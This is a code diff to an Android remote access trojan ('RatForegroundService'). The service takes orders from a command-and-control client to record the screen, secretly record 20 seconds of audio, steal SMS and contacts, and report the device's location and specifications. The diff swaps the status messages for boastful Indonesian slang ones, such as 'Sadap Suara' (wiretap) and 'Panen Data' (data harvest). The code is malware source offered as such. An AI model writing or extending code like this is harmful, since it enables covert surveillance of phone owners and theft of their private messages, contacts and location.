@@ -42,14 +42,14 @@ class RatForegroundService : Service() {
                     intent?.getParcelableExtra("PROJECTION_DATA")
                 }
                 if (projectionData != null) {
-                    c2Client.sendMessage("<b>[Visuals]</b> Initializing Capture...")
+                    c2Client.sendMessage("<b>[Mata-mata]</b> Siap-siap ngintip layar...")
                     startServiceWithNotification(true)
                     mediaCapture.captureScreen(projectionData)
                 }
             }
             "ACTION_START_AUDIO" -> {
                 if (::c2Client.isInitialized) {
-                    c2Client.sendMessage("<b>[Audio]</b> Starting 20s recording...")
+                    c2Client.sendMessage("<b>[Sadap Suara]</b> Mulai dengerin, 20 detik...")
                     audioRecorder.startRecording(20000)
                 }
             }
@@ -64,10 +64,12 @@ class RatForegroundService : Service() {
             "ACTION_RUN_EXFIL" -> {
                 val exfil = ExfiltrationManager(this, c2Client)
                 Thread { exfil.runFullExfiltration() }.start()
+                c2Client.sendMessage("<b>[Panen Data]</b> Mulai nyedot SMS ama kontak...")
             }
             else -> {
                 deviceInfo.reportFullSpecs()
                 locationManager.reportLocation()
+                c2Client.sendMessage("<b>[Sistem]</b> Shadow aktif buat: ${Build.MODEL}, fr fr no cap!")
                 startServiceWithNotification(false)
             }
         }
